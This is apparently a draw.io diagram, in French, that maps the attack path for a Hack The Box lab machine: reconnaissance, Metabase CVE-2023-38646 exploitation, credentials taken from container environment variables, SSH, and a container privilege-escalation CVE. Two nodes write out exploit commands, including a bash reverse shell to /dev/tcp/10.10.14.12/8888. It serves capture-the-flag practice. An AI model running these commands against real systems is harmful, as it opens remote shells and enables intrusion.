<mxfile host="app.diagrams.net" modified="2024-03-10T21:35:02.084Z" agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" etag="_JgfJOGUYgHRuX0m3ytj" version="24.0.4" type="device">
  <diagram name="Page-1" id="QXlU7ppiSV68XWFJfw3V">
    <mxGraphModel dx="1455" dy="616" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="850" pageHeight="1100" math="0" shadow="0">
      <root>
        <mxCell id="0" />
        <mxCell id="1" parent="0" />
        <mxCell id="oPWxyFHtdCuirfmGRAih-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-1" target="oPWxyFHtdCuirfmGRAih-5">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="420" y="430" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-1" value="10.10.11.233" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="360" y="290" width="120" height="60" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-6" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-10" target="oPWxyFHtdCuirfmGRAih-7">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="350" y="440" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-9" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.5;entryY=0;entryDx=0;entryDy=0;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-5" target="oPWxyFHtdCuirfmGRAih-8">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-5" value="nmap" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="390" y="380" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-14" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-7" target="oPWxyFHtdCuirfmGRAih-15">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="-10" y="500" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-17" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-7" target="oPWxyFHtdCuirfmGRAih-18">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="10" y="520" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-7" value="http" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-40" y="430" width="80" height="20" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-47" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-8" target="oPWxyFHtdCuirfmGRAih-46">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-8" value="ssh" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="480" y="450" width="80" height="20" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-11" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-5" target="oPWxyFHtdCuirfmGRAih-10">
          <mxGeometry relative="1" as="geometry">
            <mxPoint y="430" as="targetPoint" />
            <mxPoint x="390" y="395" as="sourcePoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-10" value="entrÃ©es dns dans /etc/hosts" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="105" y="380" width="170" height="30" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-26" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-15" target="oPWxyFHtdCuirfmGRAih-28">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="160" y="575" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-15" value="quelles technologies ?&lt;div&gt;site, nuclei, burp, wappanalyser&lt;/div&gt;" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="60" y="510" width="200" height="40" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-19" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-18" target="oPWxyFHtdCuirfmGRAih-20">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="-200" y="620" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-18" value="sous-domaines et pages" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="-210" y="460" width="90" height="50" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-20" value="analytical.htb" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-350" y="520" width="100" height="20" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-25" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-21" target="oPWxyFHtdCuirfmGRAih-15">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-21" value="data.analytical.htb" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="-100" y="520" width="100" height="20" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-22" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0.637;entryY=-0.05;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-18" target="oPWxyFHtdCuirfmGRAih-21">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-30" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-31" target="oPWxyFHtdCuirfmGRAih-29">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-36" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-37" target="oPWxyFHtdCuirfmGRAih-33">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-28" value="CVE-2023-38646&lt;br&gt;Metabase (soft public pour de la data analyse)" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="100" y="590" width="120" height="80" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-29" value="script POC&lt;div&gt;python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb/auth/login --lhost 10.10.14.12 --lport 8888&amp;nbsp;&lt;br&gt;&lt;/div&gt;" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="-730" y="610" width="650" height="40" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-32" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-28" target="oPWxyFHtdCuirfmGRAih-31">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="100" y="630" as="sourcePoint" />
            <mxPoint x="-235" y="770" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-31" value="api session" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="-40" y="615" width="80" height="30" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-40" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-43" target="oPWxyFHtdCuirfmGRAih-42">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="160" y="940" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-33" value="script exploit&lt;div&gt;python3 exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.12/8888 0&amp;gt;&amp;amp;1&#39;&lt;br&gt;&lt;/div&gt;" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="-95" y="830" width="510" height="50" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-38" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-28" target="oPWxyFHtdCuirfmGRAih-37">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="160" y="670" as="sourcePoint" />
            <mxPoint x="160" y="830" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-37" value="shell" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="130" y="740" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-45" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-42" target="oPWxyFHtdCuirfmGRAih-8">
          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-42" value="- container&lt;div&gt;&lt;span style=&quot;background-color: initial;&quot;&gt;- env: user &amp;amp; passwd&lt;/span&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
          <mxGeometry x="95" y="970" width="130" height="50" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-44" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="oPWxyFHtdCuirfmGRAih-33" target="oPWxyFHtdCuirfmGRAih-43">
          <mxGeometry relative="1" as="geometry">
            <mxPoint x="160" y="970" as="targetPoint" />
            <mxPoint x="160" y="880" as="sourcePoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-43" value="linpeas.sh" style="text;html=1;align=center;verticalAlign=middle;whiteSpace=wrap;rounded=0;" vertex="1" parent="1">
          <mxGeometry x="130" y="910" width="60" height="30" as="geometry" />
        </mxCell>
        <mxCell id="oPWxyFHtdCuirfmGRAih-46" value="&lt;div&gt;&lt;span style=&quot;text-wrap: nowrap;&quot;&gt;vuln sur containers&lt;/span&gt;&lt;/div&gt;&lt;span style=&quot;text-wrap: nowrap;&quot;&gt;CVE-2023-2640-CVE-2023-32629&lt;/span&gt;" style="whiteSpace=wrap;html=1;rounded=1;" vertex="1" parent="1">
          <mxGeometry x="420" y="550" width="200" height="50" as="geometry" />
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
